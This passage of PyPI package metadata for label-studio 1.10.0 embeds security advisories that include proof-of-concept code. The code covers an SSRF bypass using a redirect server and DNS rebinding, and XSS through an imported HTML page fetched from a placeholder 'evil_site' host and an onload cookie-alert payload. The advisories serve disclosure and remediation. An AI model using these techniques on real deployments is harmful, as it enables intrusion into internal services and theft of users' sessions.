3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"Apache-2.0","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.10.0/","requires_dist":["Django (>=3.2.23,<3.3.0)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","azure-storage-blob (>=12.6.0)","bleach (>=5.0.0,<5.1.0)","boto (>=2.49.0,<3.0.0)","boto3 (>=1.28.58,<2.0.0)","botocore (>=1.31.58,<2.0.0)","boxing (>=0.1.4)","colorama (>=0.4.4)","defusedxml (>=0.7.1)","django-annoying (==0.10.6)","django-cors-headers (==3.6.0)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-extensions (==3.1.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-ranged-fileresponse (>=0.1.2)","django-rq (==2.5.1)","django-storages (==1.12.3)","django-user-agents (==0.4.0)","djangorestframework (==3.13.1)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-generators (==0.3.0)","google-cloud-storage (>=2.13.0,<3.0.0)","htmlmin (==0.1.12)","humansignal-drf-yasg (>=1.21.9)","jsonschema (==3.2.0)","label-studio-converter (==0.0.57)","launchdarkly-server-sdk (==7.5.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","mysqlclient ; extra == \"mysql\"","numpy (>=1.24.3,<2.0.0)","ordered-set (==4.0.2)","pandas (>=0.24.0)","psycopg2-binary (==2.9.6)","pydantic (>=1.7.3,<=1.11.0)","python-dateutil (>=2.8.1)","python-json-logger (==2.0.4)","pytz (>=2022.1,<2023.0)","pyyaml (>=6.0.0)","redis (>=3.5,<4.0)","requests (==2.31.0)","rq (==1.10.1)","rules (==2.2)","sentry-sdk (>=1.1.0)","ujson (>=3.0.0)","urllib3 (>=1.26.18,<2.0.0)","wheel (>=0.38.1,<=0.40.0)","xmljson (==0.2.0)"],"requires_python":">=3.8,<4","summary":"Label Studio annotation tool","version":"1.10.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"0e30a930dee09ad879959144fca772d0c99e3760f7ebddf585128175c012c300","md5":"8ff333a275480528df8a2b205cb2dd6f","sha256":"047b482c80b286b22ca9fce2e065cf16a19b35f50c0fd87ba957b05017afab46"},"downloads":-1,"filename":"label_studio-1.10.0-py3-none-any.whl","has_sig":false,"md5_digest":"8ff333a275480528df8a2b205cb2dd6f","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4","size":58645480,"upload_time":"2023-12-01T19:30:06","upload_time_iso_8601":"2023-12-01T19:30:06.897054Z","url":"https://files.pythonhosted.org/packages/0e/30/a930dee09ad879959144fca772d0c99e3760f7ebddf585128175c012c300/label_studio-1.10.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8d8b8ddd00537648a0c032326ac449f7c9d92a01908cc75488b9b66e2fc3f13c","md5":"d56a5a9542932ca6d594809537b6e8d5","sha256":"ffaf329adb755c59ff932efb938b20ca5e5a827a80f143803ce0a76ae7849c27"},"downloads":-1,"filename":"label_studio-1.10.0.tar.gz","has_sig":false,"md5_digest":"d56a5a9542932ca6d594809537b6e8d5","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4","size":57354840,"upload_time":"2023-12-01T19:30:14","upload_time_iso_8601":"2023-12-01T19:30:14.306962Z","url":"https://files.pythonhosted.org/packages/8d/8b/8ddd00537648a0c032326ac449f7c9d92a01908cc75488b9b66e2fc3f13c/label_studio-1.10.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.10.0.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"Apache-2.0","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.10.0.post0/","requires_dist":["Django (>=3.2.23,<3.3.0)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","azure-storage-blob (>=12.6.0)","bleach (>=5.0.0,<5.1.0)","boto (>=2.49.0,<3.0.0)","boto3 (>=1.28.58,<2.0.0)","botocore (>=1.31.58,<2.0.0)","boxing (>=0.1.4)","colorama (>=0.4.4)","defusedxml (>=0.7.1)","django-annoying (==0.10.6)","django-cors-headers (==3.6.0)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-extensions (==3.1.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-ranged-fileresponse (>=0.1.2)","django-rq (==2.5.1)","django-storages (==1.12.3)","django-user-agents (==0.4.0)","djangorestframework (==3.13.1)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-generators (==0.3.0)","google-cloud-storage (>=2.13.0,<3.0.0)","htmlmin (==0.1.12)","humansignal-drf-yasg (>=1.21.9)","jsonschema (==3.2.0)","label-studio-converter (==0.0.57)","launchdarkly-server-sdk (==7.5.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","mysqlclient ; extra == \"mysql\"","numpy (>=1.24.3,<2.0.0)","ordered-set (==4.0.2)","pandas (>=0.24.0)","psycopg2-binary (==2.9.6)","pydantic (>=1.7.3,<=1.11.0)","python-dateutil (>=2.8.1)","python-json-logger (==2.0.4)","pytz (>=2022.1,<2023.0)","pyyaml (>=6.0.0)","redis (>=3.5,<4.0)","requests (==2.31.0)","rq (==1.10.1)","rules (==2.2)","sentry-sdk (>=1.1.0)","ujson (>=3.0.0)","urllib3 (>=1.26.18,<2.0.0)","wheel (>=0.38.1,<=0.40.0)","xmljson (==0.2.0)"],"requires_python":">=3.8,<4","summary":"Label Studio annotation tool","version":"1.10.0.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"ed0f7da8ef1d0c672a59f1862dd128a344091ae6697bf8cf30b526250a993b4c","md5":"ef1a747c8d53d16b7bfadb0b3ae21eff","sha256":"857772657260eceb40125b27ddf37e1f80e45c490b61c74f813d071a91e50b27"},"downloads":-1,"filename":"label_studio-1.10.0.post0-py3-none-any.whl","has_sig":false,"md5_digest":"ef1a747c8d53d16b7bfadb0b3ae21eff","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4","size":58645760,"upload_time":"2023-12-08T22:09:49","upload_time_iso_8601":"2023-12-08T22:09:49.958658Z","url":"https://files.pythonhosted.org/packages/ed/0f/7da8ef1d0c672a59f1862dd128a344091ae6697bf8cf30b526250a993b4c/label_studio-1.10.0.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"3d8108d247b1acc3ae6e10324ead6ac6eebf2295e425ae06ca473ef9e39c78ad","md5":"1d95d3f588690b3c7478e4360023aea9","sha256":"908cb2a357cdd5532d0e1388323030add1e4542b0e09a582ee4959d5364f39c5"},"downloads":-1,"filename":"label_studio-1.10.0.post0.tar.gz","has_sig":false,"md5_digest":"1d95d3f588690b3c7478e4360023aea9","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4","size":57359787,"upload_time":"2023-12-08T22:09:55","upload_time_iso_8601":"2023-12-08T22:09:55.482987Z","url":"https://files.pythonhosted.org/packages/3d/81/08d247b1acc3ae6e10324ead6ac6eebf2295e425ae06ca473ef9e39c78ad/label_studio-1.10.0.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: 